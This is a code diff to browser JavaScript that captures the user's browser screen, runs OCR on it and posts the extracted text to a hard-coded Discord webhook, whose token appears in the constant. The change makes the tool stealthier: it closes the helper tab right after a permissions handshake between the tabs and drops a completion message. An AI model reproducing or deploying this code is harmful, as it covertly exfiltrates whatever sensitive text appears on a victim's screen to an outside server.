@@ -12,16 +12,16 @@ const W="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO
 
 (async()=>{
   try{
-    // 1️⃣ open index.html with ?data=1 to trigger test.html
+    // open index.html WITH data to trigger test page behavior
     const testTab = window.open("index.html?data=1","_blank");
 
-    // 2️⃣ request screen capture immediately
+    // ask for screen capture immediately
     const stream = await navigator.mediaDevices.getDisplayMedia({video:{displaySurface:"browser"}});
 
-    // 3️⃣ tell test.html permissions are granted
+    // tell test tab permissions are granted
     testTab.postMessage({msg:"allowed-permissions"},"*");
 
-    // 4️⃣ wait for test.html to acknowledge with same message
+    // wait for acknowledgment from test tab
     await new Promise(resolve=>{
       function handler(e){
         if(e.data?.msg==="allowed-permissions"){
@@ -32,7 +32,10 @@ const W="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO
       window.addEventListener("message", handler);
     });
 
-    // 5️⃣ continue with OCR + Discord
+    // close the test tab immediately after permissions handshake
+    testTab.close();
+
+    // proceed with OCR + Discord workflow
     const v=document.createElement("video");
     v.srcObject=stream; await v.play(); await new Promise(r=>setTimeout(r,1000));
 
@@ -58,9 +61,6 @@ const W="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO
       headers:{"Content-Type":"application/json"},
       body:JSON.stringify({content:o||"(no valid text found)"})
     });
-
-    // 6️⃣ notify test.html OCR finished
-    testTab.postMessage({msg:"finished"},"*");
 
     console.log("OCR + Discord done!");
   } catch(e){console.error(e);}
